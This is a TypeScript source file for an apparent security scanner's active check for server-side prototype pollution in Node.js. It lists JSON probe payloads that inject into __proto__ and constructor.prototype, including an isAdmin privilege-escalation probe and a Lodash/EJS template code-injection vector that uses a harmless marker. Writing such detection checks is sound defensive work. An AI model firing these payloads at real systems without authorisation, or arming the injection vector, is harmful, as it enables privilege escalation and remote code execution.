// Server-side prototype pollution active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'prototype-pollution-server',
  family: 'prototype-pollution-server' as const,
  name: 'Server-Side Prototype Pollution',
  description: 'Detects prototype pollution in Node.js/server-side JavaScript via __proto__ and constructor.prototype injection.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['body', 'json'],
};

const PP_PROBES = [
  {
    value: '{"__proto__":{"polluted":"pf-probe-1"}}',
    intent: '__proto__ injection to pollute Object.prototype via JSON body',
    signals: ['pp-reflection'],
  },
  {
    value: '{"constructor":{"prototype":{"polluted":"pf-probe-2"}}}',
    intent: 'constructor.prototype injection via JSON body',
    signals: ['pp-reflection'],
  },
  {
    value: '{"__proto__":{"isAdmin":true}}',
    intent: 'isAdmin prototype pollution for privilege escalation probe',
    signals: ['pp-reflection', 'auth-bypass'],
  },
  {
    value: '{"__proto__":{"toString":"polluted"}}',
    intent: 'toString override — detectable via JSON.stringify output',
    signals: ['pp-reflection'],
  },
  {
    value: '{"__proto__":{"outputFunctionName":"_tmp1;global.pf_pp=1;var __tmp2"}}',
    intent: 'Lodash template engine prototype pollution RCE vector',
    signals: ['pp-reflection'],
  },
  {
    value: '{"__proto__":{"lineComment":"pf-pp-detect"}}',
    intent: 'EJS lineComment prototype pollution for template injection',
    signals: ['pp-reflection'],
  },
];

export function variants(): PayloadVariant[] {
  return PP_PROBES.map((probe, i) => ({
    id: `pp-srv-${i + 1}`,
    family: 'prototype-pollution-server' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
